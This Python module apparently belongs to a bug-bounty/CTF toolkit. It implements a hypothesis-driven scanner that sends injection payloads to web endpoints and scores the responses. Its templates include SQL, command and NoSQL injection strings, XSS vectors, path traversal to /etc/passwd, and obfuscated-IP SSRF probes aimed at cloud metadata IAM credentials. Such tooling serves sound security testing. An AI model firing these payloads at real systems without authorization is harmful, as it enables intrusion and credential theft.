"""Hypothesis-driven testing engine.

Replaces the fire-all-payloads approach with a structured reasoning loop:
1. Form hypothesis (e.g., "this parameter is vulnerable to SQLi")
2. Design a discriminating test (payload that would confirm or deny)
3. Execute and observe
4. Update confidence based on evidence
5. Decide: confirm, refine, or abandon hypothesis

This gives the agent a reasoning scaffold instead of blind spraying.

Usage:
    from bugbounty_ctf.hypothesis import HypothesisEngine, Hypothesis

    engine = HypothesisEngine(scanner)
    engine.add_hypothesis(Hypothesis(
        vuln_type="sqli",
        endpoint="/login",
        param="username",
        description="Login form accepts SQL injection in username field",
        confidence=0.3,
        tests=[
            {"payload": "'", "expect": "error_or_different_response", "weight": 0.2},
            {"payload": "' OR 1=1--", "expect": "auth_bypass", "weight": 0.5},
        ],
    ))
    results = engine.run()
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

from bugbounty_ctf.engine import SecurityScanner, confirm_vulnerability


@dataclass
class TestStep:
    """A single test within a hypothesis."""

    payload: str
    expect: str = "different_response"
    weight: float = 0.2
    method: str = "GET"
    done: bool = False
    result: str = ""
    evidence_for: bool = False
    evidence_against: bool = False

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload": self.payload,
            "expect": self.expect,
            "weight": self.weight,
            "done": self.done,
            "result": self.result[:200],
            "evidence_for": self.evidence_for,
            "evidence_against": self.evidence_against,
        }


@dataclass
class Hypothesis:
    """A vulnerability hypothesis with confidence tracking."""

    vuln_type: str
    endpoint: str
    param: str
    description: str = ""
    confidence: float = 0.1
    threshold: float = 0.7
    tests: list[TestStep] = field(default_factory=list)
    confirmed: bool = False
    rejected: bool = False

    def update_confidence(self, test: TestStep) -> None:
        """Update confidence based on test evidence."""
        if test.evidence_for:
            self.confidence = min(1.0, self.confidence + test.weight)
        elif test.evidence_against:
            self.confidence = max(0.0, self.confidence - test.weight * 1.5)

        if self.confidence >= self.threshold:
            self.confirmed = True
        elif self.confidence <= 0.05:
            self.rejected = True

    def to_dict(self) -> dict[str, Any]:
        return {
            "vuln_type": self.vuln_type,
            "endpoint": self.endpoint,
            "param": self.param,
            "description": self.description,
            "confidence": round(self.confidence, 3),
            "threshold": self.threshold,
            "confirmed": self.confirmed,
            "rejected": self.rejected,
            "tests": [t.to_dict() for t in self.tests],
        }


DEFAULT_HYPOTHESES: list[dict[str, Any]] = [
    {
        "vuln_type": "sqli",
        "description": "Parameter accepts SQL injection — error-based or union-based",
        "tests": [
            {"payload": "'", "expect": "sql_error", "weight": 0.2},
            {"payload": "' OR '1'='1", "expect": "auth_bypass_or_different", "weight": 0.3},
            {"payload": "' UNION SELECT NULL--", "expect": "different_response", "weight": 0.2},
            {"payload": "1' AND SLEEP(3)--", "expect": "time_delay", "weight": 0.3},
        ],
    },
    {
        "vuln_type": "ssrf",
        "description": "Parameter is used as a URL to fetch — SSRF possible",
        "tests": [
            {"payload": "http://0177.0.0.1/#.yaml", "expect": "different_response", "weight": 0.3},
            {
                "payload": "http://2852039166/latest/meta-data/iam/security-credentials/#.yaml",
                "expect": "contains_metadata",
                "weight": 0.5,
            },
            {"payload": "http://0#.yaml", "expect": "different_response", "weight": 0.2},
        ],
    },
    {
        "vuln_type": "cmdi",
        "description": "Parameter is passed to a system command",
        "tests": [
            {"payload": "; id", "expect": "contains_uid", "weight": 0.4},
            {"payload": "| id", "expect": "contains_uid", "weight": 0.3},
            {"payload": "$(id)", "expect": "contains_uid", "weight": 0.3},
        ],
    },
    {
        "vuln_type": "xss",
        "description": "Parameter is reflected in the response without escaping",
        "tests": [
            {
                "payload": "<script>alert(1)</script>",
                "expect": "reflected_unescaped",
                "weight": 0.4,
            },
            {"payload": "<svg onload=alert(1)>", "expect": "reflected_unescaped", "weight": 0.3},
        ],
    },
    {
        "vuln_type": "lfi",
        "description": "Parameter is used in a file path — path traversal possible",
        "tests": [
            {"payload": "../../../etc/passwd", "expect": "contains_root:x:0", "weight": 0.4},
            {
                "payload": "../../../../../../etc/hosts",
                "expect": "contains_localhost",
                "weight": 0.2,
            },
        ],
    },
    {
        "vuln_type": "ssrf",
        "description": "Parameter is used as a URL to fetch — SSRF possible",
        "tests": [
            {"payload": "http://0177.0.0.1", "expect": "different_response", "weight": 0.3},
            {
                "payload": "http://2852039166/latest/meta-data/",
                "expect": "contains_metadata",
                "weight": 0.4,
            },
            {"payload": "http://0", "expect": "different_response", "weight": 0.2},
        ],
    },
    {
        "vuln_type": "idor",
        "description": "Sequential ID parameter allows access to other users' data",
        "tests": [
            {"payload": "2", "expect": "different_200_response", "weight": 0.3},
            {"payload": "0", "expect": "different_response", "weight": 0.2},
        ],
    },
    {
        "vuln_type": "nosqli",
        "description": "JSON endpoint accepts NoSQL injection operators",
        "tests": [
            {"payload": '{"$ne": null}', "expect": "different_response", "weight": 0.3},
            {"payload": '{"$gt": ""}', "expect": "different_response", "weight": 0.2},
        ],
    },
]


EXPECT_PATTERNS: dict[str, list[str]] = {
    "sql_error": [
        r"SQL syntax",
        r"sqlite3\.OperationalError",
        r"pymysql\.err",
        r"psycopg2\.ProgrammingError",
        r"ORA-\d+",
        r"mysql_fetch",
    ],
    "contains_49": [r"\b49\b"],
    "contains_7777777": [r"7777777"],
    "contains_uid": [r"uid=\d+", r"gid=\d+"],
    "reflected_unescaped": [],
    "contains_root:x:0": [r"root:x:0:0"],
    "contains_localhost": [r"127\.0\.0\.1.*localhost"],
    "contains_metadata": [r"ami-id", r"instance-id", r"iam/", r"meta-data"],
    "auth_bypass_or_different": [],
    "different_response": [],
    "different_200_response": [],
    "time_delay": [],
}


class HypothesisEngine:
    """Hypothesis-driven vulnerability testing engine.

    Instead of firing all payloads blindly, this engine:
    1. Generates hypotheses about what vulnerabilities might exist
    2. Designs discriminating tests for each hypothesis
    3. Executes tests and collects evidence
    4. Updates confidence based on evidence (Bayesian-ish)
    5. Confirms or rejects each hypothesis
    """

    def __init__(self, scanner: SecurityScanner) -> None:
        self.scanner = scanner
        self.hypotheses: list[Hypothesis] = []
        self.confirmed: list[Hypothesis] = []
        self.rejected: list[Hypothesis] = []

    def generate_hypotheses(
        self,
        endpoint: str,
        method: str = "GET",
        params: dict[str, str] | None = None,
        data: dict[str, str] | None = None,
    ) -> list[Hypothesis]:
        """Generate hypotheses for each parameter at an endpoint."""
        is_post = method.upper() in ("POST", "PUT", "PATCH")
        test_data = data if is_post else (params or {})

        if not test_data:
            return []

        new_hypotheses: list[Hypothesis] = []

        for param_name in test_data:
            param_lower = param_name.lower()

            for template in DEFAULT_HYPOTHESES:
                vuln_type = template["vuln_type"]

                if vuln_type == "ssrf" and "url" not in param_lower and "fetch" not in param_lower:
                    continue

                tests = [
                    TestStep(
                        payload=t["payload"],
                        expect=t["expect"],
                        weight=t["weight"],
                        method=method,
                    )
                    for t in template["tests"]
                ]

                h = Hypothesis(
                    vuln_type=vuln_type,
                    endpoint=endpoint,
                    param=param_name,
                    description=template["description"],
                    confidence=0.1,
                    tests=tests,
                )
                new_hypotheses.append(h)

        self.hypotheses.extend(new_hypotheses)
        return new_hypotheses

    def run(self) -> dict[str, Any]:
        """Execute all hypotheses and return results.

        For each hypothesis:
        - Get baseline response
        - Run each test step
        - Check if the result matches expectations
        - Update confidence based on evidence
        - Confirm or reject
        """
        results: list[Hypothesis] = []

        for h in self.hypotheses:
            if h.confirmed or h.rejected:
                continue

            print(f"\n[*] Testing hypothesis: {h.vuln_type} on {h.param}")
            print(f"    Confidence: {h.confidence:.0%} — {h.description}")

            is_post = h.tests[0].method.upper() in ("POST", "PUT", "PATCH")

            baseline_kwargs: dict[str, Any] = {}
            if is_post:
                baseline_kwargs["data"] = {h.param: "baseline_test_value"}
            else:
                baseline_kwargs["params"] = {h.param: "baseline_test_value"}

            baseline = self.scanner._make_request(h.tests[0].method, h.endpoint, **baseline_kwargs)
            baseline_text = baseline.text
            baseline_length = len(baseline.text)
            baseline_time = getattr(baseline, "response_time", 0.1)

            for test in h.tests:
                if test.done:
                    continue

                test.done = True

                test_kwargs: dict[str, Any] = {}
                if is_post:
                    test_kwargs["data"] = {h.param: test.payload}
                else:
                    test_kwargs["params"] = {h.param: test.payload}

                response = self.scanner._make_request(test.method, h.endpoint, **test_kwargs)
                response_text = response.text
                response_length = len(response_text)
                response_time = getattr(response, "response_time", 0.0)

                evidence_for = self._check_evidence(
                    test.expect,
                    response_text,
                    baseline_text,
                    response_length,
                    baseline_length,
                    response_time,
                    baseline_time,
                    h.vuln_type,
                    test.payload,
                )

                evidence_against = self._check_contradiction(
                    test.expect,
                    response_text,
                    baseline_text,
                    response_length,
                    baseline_length,
                )

                if evidence_for:
                    test.evidence_for = True
                    test.result = "confirmed"
                    print(f"    [+] '{test.payload}' → EVIDENCE FOR (weight +{test.weight})")
                elif evidence_against:
                    test.evidence_against = True
                    test.result = "contradicted"
                    print(
                        f"    [-] '{test.payload}' → evidence against (weight -{test.weight * 1.5:.2f})"
                    )
                else:
                    test.result = "inconclusive"
                    print(f"    [?] '{test.payload}' → inconclusive")

                h.update_confidence(test)

                if h.confirmed:
                    print(f"    [!] CONFIRMED: {h.vuln_type} confidence={h.confidence:.0%}")
                    self.scanner._record_finding(
                        h.endpoint,
                        test.method,
                        test.payload,
                        [f"hypothesis_confirmed:{h.vuln_type}"],
                        [f"Confidence: {h.confidence:.0%}", f"Description: {h.description}"],
                        h.vuln_type,
                    )
                    self.confirmed.append(h)
                    break

                if h.rejected:
                    print(f"    [x] REJECTED: {h.vuln_type} confidence={h.confidence:.0%}")
                    self.rejected.append(h)
                    break

            results.append(h)

        confirmed_count = len(self.confirmed)
        rejected_count = len(self.rejected)
        pending_count = len(self.hypotheses) - confirmed_count - rejected_count

        print(
            f"\n[*] Hypothesis engine: {confirmed_count} confirmed, "
            f"{rejected_count} rejected, {pending_count} inconclusive"
        )

        return {
            "confirmed": [h.to_dict() for h in self.confirmed],
            "rejected": [h.to_dict() for h in self.rejected],
            "all": [h.to_dict() for h in results],
            "summary": {
                "confirmed_count": confirmed_count,
                "rejected_count": rejected_count,
                "inconclusive_count": pending_count,
            },
        }

    @staticmethod
    def _check_evidence(
        expect: str,
        response_text: str,
        baseline_text: str,
        response_length: int,
        baseline_length: int,
        response_time: float,
        baseline_time: float,
        vuln_type: str,
        payload: str,
    ) -> bool:
        """Check if the response provides evidence FOR the hypothesis."""
        patterns = EXPECT_PATTERNS.get(expect, [])
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE) and not re.search(
                pattern, baseline_text, re.IGNORECASE
            ):
                return True

        if expect == "reflected_unescaped":
            return payload in response_text and payload not in baseline_text

        if expect == "different_response" and abs(response_length - baseline_length) > max(
            100, baseline_length * 0.1
        ):
            return confirm_vulnerability(vuln_type, response_text, baseline_text, payload)

        if (
            expect == "different_200_response"
            and response_length != baseline_length
            and abs(response_length - baseline_length) > 50
        ):
            return True

        if expect == "time_delay" and response_time > baseline_time * 2 and response_time > 1.0:
            return True

        if expect == "auth_bypass_or_different":
            if "welcome" in response_text.lower() or "dashboard" in response_text.lower():
                return True
            if response_length != baseline_length and abs(response_length - baseline_length) > 100:
                return confirm_vulnerability(vuln_type, response_text, baseline_text, payload)

        return False

    @staticmethod
    def _check_contradiction(
        expect: str,
        response_text: str,
        baseline_text: str,
        response_length: int,
        baseline_length: int,
    ) -> bool:
        """Check if the response contradicts the hypothesis."""
        if abs(response_length - baseline_length) < 10:
            return True
        return response_text == baseline_text

    def get_results(self) -> dict[str, Any]:
        """Return all results."""
        return {
            "confirmed": [h.to_dict() for h in self.confirmed],
            "rejected": [h.to_dict() for h in self.rejected],
            "all": [h.to_dict() for h in self.hypotheses],
        }
